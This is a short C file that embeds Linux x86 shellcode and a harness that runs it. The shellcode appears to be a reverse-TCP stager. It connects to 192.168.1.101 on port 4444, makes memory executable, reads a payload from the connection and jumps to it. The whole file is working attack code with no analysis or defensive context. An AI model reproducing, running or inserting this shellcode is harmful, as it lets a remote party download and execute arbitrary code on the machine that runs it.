#include<stdio.h>
#include<string.h>

unsigned char coderevmet[] = \
"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\xb0\x66\x89\xe1\xcd\x80"
"\x85\xc0\x78\x44\x97\x5b\x68\xc0\xa8\x01\x65\x68\x02\x00\x11"
"\x5c\x89\xe1\x6a\x66\x58\x50\x51\x57\x89\xe1\x43\xcd\x80\x85"
"\xc0\x78\x27\xb2\x07\xb9\x00\x10\x00\x00\x89\xe3\xc1\xeb\x0c"
"\xc1\xe3\x0c\xb0\x7d\xcd\x80\x85\xc0\x78\x10\x5b\x89\xe1\x99"
"\xb6\x0c\xb0\x03\xcd\x80\x85\xc0\x78\x02\xff\xe1\xb8\x01\x00"
"\x00\x00\xbb\x01\x00\x00\x00\xcd\x80";



void main()
{

	printf("Shellcode Length:  %d\n", strlen(coderevmet));

	int (*ret)() = (int(*)())coderevmet;

	ret();

}
